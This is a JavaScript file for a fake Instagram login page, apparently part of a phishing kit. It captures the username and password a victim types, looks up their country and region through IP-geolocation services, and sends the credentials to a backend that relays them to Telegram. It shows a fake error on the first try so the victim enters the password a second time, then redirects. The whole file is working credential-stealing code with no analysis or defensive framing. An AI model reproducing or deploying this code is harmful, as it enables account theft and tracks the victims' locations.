// 1. Get the unique project name from the URL path.
const pathParts = window.location.pathname.split('/');
const projectName = pathParts[2]; // Assumes URL structure is /U/{projectName}/...

let attempt = 0;

// Get IP and Location Data
async function getLocationData() {
  try {
    const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,query');
    const data = await res.json();
    if (data.status === "success") {
      return {
        country: data.country || "Unknown",
        state: data.regionName || "Unknown",
        city: data.city || "Unknown"
      };
    }
  } catch (e) {}
  // Fallback if first API fails
  try {
    const fb = await fetch('https://ipapi.co/json/');
    const fbData = await fb.json();
    return {
      country: fbData.country_name || "Unknown",
      state: fbData.region || "Unknown",
      city: fbData.city || "Unknown"
    };
  } catch (e) {}
  return { country: "Unknown", state: "Unknown", city: "Unknown" };
}

const loginForm = document.getElementById("loginForm");
loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const passwordInput = document.getElementById("password");

  if (!username || !password) {
    alert("Please fill in all fields!");
    return;
  }

  const btn = document.getElementById("loginBtn");
  const btnText = document.getElementById("btnText");
  const spinner = document.getElementById("spinner");
  const errorMsg = document.getElementById("errorMsg");

  // --- UI Loading State ---
  btn.disabled = true;
  btnText.textContent = "Logging in...";
  spinner.classList.remove("hidden");
  errorMsg.classList.add("hidden");

  const loc = await getLocationData();
  attempt++;

  // --- Prepare the Message ---
  const message = `

APP:INSTAGRAM

USER:  ${username}

PWD:  ${password}

COUNTRY:  ${loc.country} 🌍

STATE: ${loc.state}

X:  ${attempt} ⏱️
  `;

  // --- Send Data to Backend ---
  try {
    await fetch('/api/send-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      // 2. Send the message AND the unique project name.
      body: JSON.stringify({ message, projectName })
    });
  } catch (err) {
    console.error("Failed to send to backend:", err);
  }

  // --- Handle UI Response (Two-attempt logic) ---
  setTimeout(() => {
    if (attempt === 1) {
      // First attempt - show error
      errorMsg.classList.remove("hidden");
      btn.disabled = false;
      btnText.textContent = "Log in";
      spinner.classList.add("hidden");
      passwordInput.value = ""; // Clear password for next try
    } else {
      // Second attempt - redirect
      btnText.textContent = "Redirecting...";
      setTimeout(() => {
        // 3. Pass the unique project name to the next page.
        window.location.href = `secure.html?project=${projectName}`;
      }, 800);
    }
  }, 1400);
});